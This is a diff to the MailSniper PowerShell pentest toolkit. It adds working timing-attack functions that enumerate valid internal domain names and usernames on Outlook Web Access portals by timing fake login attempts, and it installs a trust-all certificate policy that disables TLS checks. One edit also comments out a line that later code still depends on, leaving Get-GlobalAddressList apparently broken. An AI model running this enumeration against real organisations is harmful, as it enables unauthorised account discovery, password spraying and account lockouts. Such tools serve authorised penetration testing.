@@ -799,7 +799,10 @@ function Get-GlobalAddressList{
         $FindPeopleResults = Invoke-WebRequest -Uri $FindPeopleURL -Method POST -ContentType "application/json" -Body "{`"__type`":`"FindPeopleJsonRequest:#Exchange`",`"Header`":{`"__type`":`"JsonRequestHeaders:#Exchange`",`"RequestServerVersion`":`"Exchange2013`",`"TimeZoneContext`":{`"__type`":`"TimeZoneContext:#Exchange`",`"TimeZoneDefinition`":{`"__type`":`"TimeZoneDefinitionType:#Exchange`",`"Id`":`"Mountain Standard Time`"}}},`"Body`":{`"__type`":`"FindPeopleRequest:#Exchange`",`"IndexedPageItemView`":{`"__type`":`"IndexedPageView:#Exchange`",`"BasePoint`":`"Beginning`",`"Offset`":0,`"MaxEntriesReturned`":999999999},`"QueryString`":null,`"ParentFolderId`":{`"__type`":`"TargetFolderId:#Exchange`",`"BaseFolderId`":{`"__type`":`"AddressListId:#Exchange`",`"Id`":`"$AddressListId`"}},`"PersonaShape`":{`"__type`":`"PersonaResponseShape:#Exchange`",`"BaseShape`":`"Default`"},`"ShouldResolveOneOffEmailAddress`":false}}" -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="FindPeople"} -WebSession $owasession
         $FPPreClean = @()
         $FPPreClean = $FindPeopleResults.RawContent
-        $FPPreArray = $FPPreClean -split '"EmailAddress":"', 0, "simplematch"
+        #$FPPreArray = $FPPreClean -split '"EmailAddress":"', 0, "simplematch"
+        
+        Write-Output $FPPreClean
+
         $FPPreArray[0] = ""
         $cleanarray = @()
         foreach ($entry in $FPPreArray)
@@ -1324,6 +1327,168 @@ function LoadEWSDLL{
 
 }
 
+function Invoke-DomainHarvestOWA {
+<#
+  .SYNOPSIS
+
+    This module will attempt to connect to an Outlook Web Access portal and determine a valid domain name for logging into the portal.
+
+    MailSniper Function: Invoke-DomainHarvestOWA
+    Author: Brian Fehrman (@fullmetalcache) and Beau Bullock (@dafthack) (mostly a copy and paste of Beau's Invoke-PasswordSpray OWA function)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+    .DESCRIPTION
+
+        This module will attempt to harvest the domain name from an Outlook Web Access portal. The module uses an anomaly where invalid domain names with any username have a much shorter response time than valid domain names with invalid usernames. The module uses a username and password combination that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+
+    .PARAMETER ExchHostname
+
+        The hostname of the Exchange server to connect to.
+ 
+    .PARAMETER OutFile
+
+        Outputs the results to a text file.
+
+    .PARAMETER DomainList
+
+        List of potential domain names to check for validity (1 per line)
+
+    .PARAMETER CompanyName
+        
+        Automatically generate and try potential domain names based upon a company name
+  
+  .EXAMPLE
+
+    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt
+
+    Description
+    -----------
+    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to harvest a list of valid domains by combining each potential domain name provided with an arbitrary username and password and write to a file called owa-valid-users.txt.
+
+#>
+  Param(
+
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [system.URI]
+    $ExchHostname = "",
+
+    [Parameter(Position = 1, Mandatory = $True)]
+    [string]
+    $OutFile = "",
+
+    [Parameter(Position = 2, Mandatory = $False)]
+    [string]
+    $DomainList = "",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
+    $CompanyName = ""
+
+  )
+    
+    Write-Host -ForegroundColor "yellow" "[*] Harvesting Domain Name from the OWA portal at https://$ExchHostname/owa/"
+    #Setting up URL's for later
+    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
+    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
+    
+    $Domains = @()
+
+    if ($DomainList -ne "") {
+        $Domains += Get-Content $DomainList
+    }
+    elseif ($CompanyName -ne "") {
+        
+        #Generate a list of potential domain names based on spacing and mixed capitalization
+        $Domains = Gen-Names -Name $CompanyName
+    }
+    else {
+        Write-Output -ForegroundColor "red" "You must provide either a DomainList or a ComapnyName"
+        return
+    }
+
+    #Generate random 10-character username and password
+    #source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/
+    $Username = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $Password = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $sprayed = @()
+    $domainlists = @{}
+    $count = 0 
+
+
+    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
+    ## Code From http://poshcode.org/624
+
+    ## Create a compilation environment
+    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
+    $Compiler=$Provider.CreateCompiler()
+    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
+    $Params.GenerateExecutable=$False
+    $Params.GenerateInMemory=$True
+    $Params.IncludeDebugInformation=$False
+    $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+    $TASource=@'
+    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
+      public class TrustAll : System.Net.ICertificatePolicy {
+        public TrustAll() { 
+        }
+        public bool CheckValidationResult(System.Net.ServicePoint sp,
+          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+          System.Net.WebRequest req, int problem) {
+          return true;
+        }
+      }
+    }
+'@ 
+    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
+    $TAAssembly=$TAResults.CompiledAssembly
+
+    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
+
+    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2
+    $Thresh = $AvgTime * 2.75
+
+    $fullresults = @()
+
+    Write-Host "Threshold: $Thresh"
+    Write-Host ""
+    ## end code from http://poshcode.org/624
+	Write-Host "Response Time (MS) `t Domain\Username"
+    ForEach($Dom in $Domains)
+    {
+        #Logging into Outlook Web Access    
+        #Setting POST parameters for the login to OWA
+        $ProgressPreference = 'silentlycontinue'
+        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Dom\$Username";password="$Password";isUtf8='1'}
+
+        #Primer Request
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
+
+        $Timer = [system.diagnostics.stopwatch]::startNew()
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
+        $TimeTaken = [double]$Timer.ElapsedMilliseconds
+
+		Write-Host "$TimeTaken `t`t`t $Dom\$username"
+
+		if ($TimeTaken -ge $Thresh )
+        {
+            Write-Host -ForegroundColor "yellow" "[*] Potentialy Valid Domain! Domain:$Dom"
+            $fullresults += $Dom
+        }
+    }
+
+    Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid domains found.")
+    if ($OutFile -ne "") {
+            $fullresults | Out-File -Encoding ascii $OutFile
+            Write-Host "Results have been written to $OutFile."
+    }
+}
+
 function Invoke-UsernameHarvestOWA {
 <#
   .SYNOPSIS
@@ -1391,7 +1556,7 @@ function Invoke-UsernameHarvestOWA {
 
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
-    $Password = "nowaythisisyourpassyo!",
+    $Password = "",
     
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
@@ -1399,7 +1564,7 @@ function Invoke-UsernameHarvestOWA {
     
     [Parameter(Position = 5, Mandatory = $False)]
     [string]
-    $Threads = "5"
+    $Threads = "1"
 
   )
     
@@ -1410,20 +1575,14 @@ function Invoke-UsernameHarvestOWA {
     
     $Usernames = @()
     $Usernames += Get-Content $UserList
+    $Users = @()
     $count = $Usernames.count
-    $sprayed = @()
-    $userlists = @{}
-    $count = 0 
-    
-    if ($Domain -ne "") {
-        $Domain = $Domain + "\"
+
+    #Gen a random password if one isnt given
+    if ($Password -eq "") {
+        $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
     }
-    
-    $Usernames |% {$userlists[$count % $Threads] += @($Domain + $_);$count++}
 
-    0..($Threads-1) |% {
-
-    Start-Job -ScriptBlock{
 
     ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
     ## Code From http://poshcode.org/624
@@ -1457,62 +1616,279 @@ function Invoke-UsernameHarvestOWA {
     $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
     [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
 
-    $Password = $args[1]
-    $OWAURL2 = $args[2]
-    $OWAURL = $args[3]
+
+    #This "primes" the username harvesting. First few names in the list can produce weird results, so use throwaways.
+    for( $i = 0; $i -lt 5; $i++ ){
+        $Users += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+    }
+
+    $Users += $Usernames
+
+    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2 -Domain $Domain
+    $Thresh = $AvgTime * 0.6
+    Write-Host "Threshold: $Thresh"
+
+    $fullresults = @()
+
+    ## end code from http://poshcode.org/624
+	Write-Host "Response Time (MS) `t Domain\Username"
+    ForEach($Username in $Users)
+    {
+
+        $CurrUser = $Domain + "\" + $Username
+        #Logging into Outlook Web Access    
+        #Setting POST parameters for the login to OWA
+        $ProgressPreference = 'silentlycontinue'
+        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$CurrUser";password="$Password";isUtf8='1'}
+
+        $Timer = [system.diagnostics.stopwatch]::startNew()
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
+        $TimeTaken = [double]$Timer.ElapsedMilliseconds
+
+		Write-Host "$TimeTaken `t`t`t $CurrUser"
+		if ($TimeTaken -le $Thresh)
+        {
+            Write-Host -ForegroundColor "yellow" "[*] Potentially Valid! User:$CurrUser"
+            $fullresults += $CurrUser
+        }
+    }
+
+    Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
+    if ($OutFile -ne "")
+       {
+            $fullresults | Out-File -Encoding ascii $OutFile
+            Write-Host "Results have been written to $OutFile."
+       }
+}
+
+
+function Gen-Names {
+<#
+  .SYNOPSIS
+
+    This module takes a string and attempts to generate various name combinations and acronyms based on the capitilzation and spacing in the string
+
+    MailSniper Function: Gen-Names
+    Author: Brian Fehrman (@fullmetalcache)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+    .DESCRIPTION
+
+        This module attempts to create a list of names and acronyms from a single string. The module looks for spacing and capitalization within the string as reference for how to generate variations of that string
+
+    .PARAMETER Name
+
+        The string to use as a seed for generating names
+  
+  .EXAMPLE
+
+    C:\PS> Gen-Names "One Cool Company"
+
+    Description
+    -----------
+    This command will split the string based on the spaces and will return and array that contains the following values:
+    One
+    OneCool
+    OneCoolCompany
+    OCC
+
+#>
+    Param(
+
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [string]
+    $Name = ""
+
+    )
+
+    Write-Host "Generating domain names..."
+
+    $NameArray = @()
+
+    #Investigate if the string has a mixture of upper and lower case characters
+    $MixedCasing = ( ($Name.ToUpper() -ne $Name) -and ($Name.ToLower() -ne $Name) )
+
+    #Check if the string has spaces
+    $HasSpaces = $Name.Contains(" ")
+
+    #Silently return an empty array if the string has no spaces or mixed casing
+    if( (-not $MixedCasing) -and (-not $HasSpaces) ) {
+        return @()
+    }
+
+    #insert spaces into the string and points where mixed casing occurs
+    #(reference:https://social.technet.microsoft.com/Forums/office/en-US/2c042285-7dcb-4126-8ee2-a297a8b7de6f/split-strings-with-capital-letters-and-numbers?forum=winserverpowershell)
+    if( $MixedCasing ) {
+        $Name = $($Name.substring(0,1).toupper() + $Name.substring(1) -creplace '[A-Z]', ' $&').Trim()
+    }
+
+    #Tokenize the name based on spaces
+    $NameTokens = $Name.Split(" ")
+
+    #Generate acronym based on spaces in the name
+    $Acronym = ""
+    $NameTokens | ForEach {
+        $Acronym += $_.Substring(0,1)
+    }
+
+    $NameArray += $Acronym
+    $NameArray += $NameTokens[0]
+    
+    #Generate Combinations of the Name based on Spaces
+    $NumTokens = $NameTokens.Length
+    for($i=0; $i -lt ($NumTokens-1); $i++) {
+
+        $NameCurr = $NameTokens[$i]
+
+        for($j=$i+1; $j -lt $NumTokens; $j++) {
+            $NameCurr += $NameTokens[$j]
+            $NameArray += $NameCurr
+        }
+    }
+
+    #List of suffixes to append
+    $Suffix=@("com", "corp", "biz")
+
+    #Iterate through the current list of potential domain names
+    #Append each of the suffixes on to each of the potential domain names
+    $DomSufs = @()
+    ForEach($Name in $NameArray) {
+        ForEach($Suf in $Suffix) {
+            $DomSufs += $Name + "." + $Suf
+        }
+    }
+
+    #Add the newly formed potential domain names to the current list
+    $NameArray += $DomSufs
+
+    $NameArray += "corp"
+    $NameArray += "internal"
+
+    Write-Host "Domains: $NameArray"
+    Write-Host ""
+
+    return $NameArray
+}
+
+function Get-BaseLineResponseTime {
+<#
+  .SYNOPSIS
+
+    This module performs a series of invalid login attempts against an OWA portal in order to determine the baseline response time for invalid users or invalid domains
+
+    MailSniper Function: Get-BaseLineResponseTime
+    Author: Brian Fehrman (@fullmetalcache)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+    .DESCRIPTION
+
+       This module is used to help determine the average time taken for an OWA server to respond when it is given either an invalid domain with an invalid username or a valid domain with an invalid username.
+       
+       Note that there is a better method for obtaining the mail's internal domain name. This will be added in future versions. This and the timing attacks are detailed by Nate Power (http://securitypentest.com/).
+
+    .PARAMETER OWAURL
+
+        OWAURL for the portal (typicallyof the form  https://<mailserverurl>/owa/auth.owa)
+
+    .PARAMETER OWAURL2
+        OWAURL2 for the portal (typically of the form https://<mailserverurl>/owa/)
+
+    .PARAMETER Domain
+        Correct Domain name for the User/Environment (if previously obtained)
+
+  
+  .EXAMPLE
+
+    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/
+
+    Description
+    -----------
+    This command will get the baseline response time for when an invalid domain name is provided to the owa portal.
+
+  .EXAMPLE
+
+    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/ -Domain ValidInternalDomain
+
+    Description
+    -----------
+    This command will get the baseline response time for when a valid domain name and an invalid username are provided to the owa portal
+
+#>
+    Param(
+
+
+    [Parameter(Position = 0, Mandatory = $True)]
+    [string]
+    $OWAURL = "",
+
+    [Parameter(Position = 1, Mandatory = $True)]
+    [string]
+    $OWAURL2 = "",
+
+    [Parameter(Position = 2, Mandatory = $False)]
+    [string]
+    $Domain = ""
+
+    )
 
     $Users = @()
 
-    #This "primes" the username harvesting. Firstname in the list produces weird results, so use a throwaway.
-    $Users += "throwaway1"
+    for($i = 0; $i -lt 5; $i++) {
+        $UserCurr = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
 
-    $Users += $args[0]
+        if( $Domain -eq "" ) {
+            $DRand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+            $Users += $Drand + "\" + $UserCurr
+        }
+        else {
+            $Users += $Domain + "\" + $UserCurr
+        }
+    }
 
-    ## end code from http://poshcode.org/624
+    $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+
+    $AvgTime = 0.0
+    $NumTries = 0.0
+
+ ## end code from http://poshcode.org/624
+    Write-Host "Determining baseline response time..."
+	Write-Host "Response Time (MS) `t Domain\Username"
     ForEach($Username in $Users)
     {
         #Logging into Outlook Web Access    
         #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
         $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Username";password="$Password";isUtf8='1'}
-        $Start = Get-Date
+        
+        #$Timer = [system.diagnostics.stopwatch]::startNew()
+        
+        #Primer Call
         $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
-        $TimeTaken = ((Get-Date) - $Start).TotalMilliseconds 
-        $out = $owalogin.RawContent
-        #Looking in the results for the OWA cadata cookie to determine whether authentication was successful or not.
-        if ($TimeTaken -le 700)
-        {
-            Write-Output "[*] Valid! User:$username"
-        }
-        $curr_user+=1 
-    }
-    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
+        
+        #$TimeTaken = [double]$Timer.ElapsedMilliseconds
+		#Write-Host "$TimeTaken `t $username"
 
-}
-$Complete = Get-Date
-$MaxWaitAtEnd = 10000
-$SleepTimer = 200
-        $fullresults = @()
-While ($(Get-Job -State Running).count -gt 0){
-    $RunningJobs = ""
-    ForEach ($Job in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
-    $RunningJobs = $RunningJobs.Substring(2)
-    Write-Progress -Activity "Password Spraying the OWA portal at https://$ExchHostname/owa/. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
-    If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
-    Start-Sleep -Milliseconds $SleepTimer
-    ForEach($Job in Get-Job){
-        $JobOutput = Receive-Job $Job
-        Write-Output $JobOutput
-        $fullresults += $JobOutput
+        $Timer = [system.diagnostics.stopwatch]::startNew()
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
+        $TimeTaken = [double]$Timer.ElapsedMilliseconds
+		Write-Host "$TimeTaken `t`t`t $username"
+        
+        #Throw away first three values, as they can sometimes be garbage
+        $NumTries += 1.0
+        $AvgTime += $TimeTaken
     }
 
-}
 
-    Write-Output ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
-    if ($OutFile -ne "")
-       {
-            $fullresults = $fullresults -replace '\[\*\] Valid! User:',''
-            $fullresults | Out-File -Encoding ascii $OutFile
-            Write-Output "Results have been written to $OutFile."
-       }
+    $AvgTime /= $NumTries
+
+    Write-Host ""
+    Write-Host "`t Baseline Response: $AvgTime"
+    Write-Host ""
+
+    return $AvgTime
 }
